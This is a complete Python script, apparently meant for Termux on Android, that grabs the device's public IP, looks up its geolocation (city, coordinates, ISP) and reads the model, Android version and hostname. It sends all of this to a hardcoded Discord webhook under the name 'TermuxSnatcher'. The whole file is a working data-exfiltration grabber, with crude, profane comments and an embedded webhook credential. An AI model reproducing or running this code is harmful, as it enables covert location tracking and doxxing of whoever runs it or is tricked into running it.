#!/usr/bin/env python3
import requests
import json
import sys
import subprocess
import re
from datetime import datetime

# Your raw webhook - no pussyfooting around
WEBHOOK_URL = "https://discord.com/api/webhooks/1488241998967210027/vvOrniALjkv7ZDEE_dlwTEAxViKfUHvZ8GMd2_OAQxAaatzuP6P6N9RxyBOG41XJ-gxb"

def get_public_ip():
    """Grab your public IP like a degenerate"""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        response.raise_for_status()
        return response.json().get("ip")
    except Exception as e:
        print(f"[!] IP fetch fucked: {e}")
        return "Unknown"

def get_ip_details(ip):
    """Get location data from ip-api.com - free, no key, no bullshit"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        response.raise_for_status()
        data = response.json()
        if data.get("status") == "success":
            return {
                "country": data.get("country", "Unknown"),
                "city": data.get("city", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "lat": data.get("lat", "N/A"),
                "lon": data.get("lon", "N/A"),
                "timezone": data.get("timezone", "Unknown")
            }
        return {"error": "Location API gave status fail"}
    except Exception as e:
        print(f"[!] Location fetch fucked: {e}")
        return {"error": str(e)}

def get_termux_device_info():
    """Scrape device info from Termux - dirty and direct"""
    info = {}
    
    # Get device model via getprop if available
    try:
        model = subprocess.check_output(["getprop", "ro.product.model"], text=True).strip()
        if model:
            info["device_model"] = model
        else:
            info["device_model"] = "Unknown"
    except:
        info["device_model"] = "Not available (no getprop)"
    
    # Get Android version
    try:
        android_ver = subprocess.check_output(["getprop", "ro.build.version.release"], text=True).strip()
        info["android_version"] = android_ver if android_ver else "Unknown"
    except:
        info["android_version"] = "Unknown"
    
    # Get device manufacturer
    try:
        manufacturer = subprocess.check_output(["getprop", "ro.product.manufacturer"], text=True).strip()
        info["manufacturer"] = manufacturer if manufacturer else "Unknown"
    except:
        info["manufacturer"] = "Unknown"
    
    # Get Termux architecture
    try:
        arch = subprocess.check_output(["uname", "-m"], text=True).strip()
        info["architecture"] = arch if arch else "Unknown"
    except:
        info["architecture"] = "Unknown"
    
    # Get hostname
    try:
        hostname = subprocess.check_output(["hostname"], text=True).strip()
        info["hostname"] = hostname if hostname else "Unknown"
    except:
        info["hostname"] = "Unknown"
    
    return info

def build_discord_payload(ip, location, device_info):
    """Assemble the filthy payload with all the goods"""
    
    # Location string assembly
    if "error" not in location:
        loc_str = f"{location.get('city', 'Unknown')}, {location.get('region', 'Unknown')}, {location.get('country', 'Unknown')}"
        coord_str = f"{location.get('lat', 'N/A')}, {location.get('lon', 'N/A')}"
        isp_str = location.get('isp', 'Unknown')
        tz_str = location.get('timezone', 'Unknown')
    else:
        loc_str = "Location fetch failed"
        coord_str = "N/A"
        isp_str = "Unknown"
        tz_str = "Unknown"
    
    # Build the message with all the juicy details
    content = f"""```
╔══════════════════════════════════════╗
║        TERMUX SNATCH REPORT           ║
╠══════════════════════════════════════╣
║ IP Address: {ip}
╠══════════════════════════════════════╣
║ LOCATION:
║   • {loc_str}
║   • Coordinates: {coord_str}
║   • ISP: {isp_str}
║   • Timezone: {tz_str}
╠══════════════════════════════════════╣
║ DEVICE:
║   • Model: {device_info.get('device_model', 'Unknown')}
║   • Manufacturer: {device_info.get('manufacturer', 'Unknown')}
║   • Android: {device_info.get('android_version', 'Unknown')}
║   • Arch: {device_info.get('architecture', 'Unknown')}
║   • Hostname: {device_info.get('hostname', 'Unknown')}
╠══════════════════════════════════════╣
║ Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
╚══════════════════════════════════════╝
```"""
    
    payload = {
        "content": content,
        "username": "TermuxSnatcher",
        "avatar_url": "https://i.imgur.com/4M34hi2.png"
    }
    
    return payload

def send_to_discord(payload):
    """Ram that payload into Discord's webhook"""
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=10)
        response.raise_for_status()
        print("[+] Data sent to Discord successfully. Check your channel.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Discord webhook failed: {e}")
        if hasattr(e, 'response') and e.response is not None:
            print(f"[!] Response body: {e.response.text}")
        return False

if __name__ == "__main__":
    print("[*] Snatching IP and device info...")
    
    # Step 1: Get IP
    ip = get_public_ip()
    print(f"[+] IP grabbed: {ip}")
    
    # Step 2: Get location data for that IP
    print("[*] Fetching location data...")
    location = get_ip_details(ip)
    
    # Step 3: Get Termux device info
    print("[*] Scraping device info...")
    device_info = get_termux_device_info()
    
    # Step 4: Build and send payload
    print("[*] Assembling payload and sending to Discord...")
    payload = build_discord_payload(ip, location, device_info)
    
    if send_to_discord(payload):
        print("[+] All done. Your data's been sucked into Discord.")
    else:
        print("[!] Failed to send. Webhook might be dead or Discord's being a cunt.")
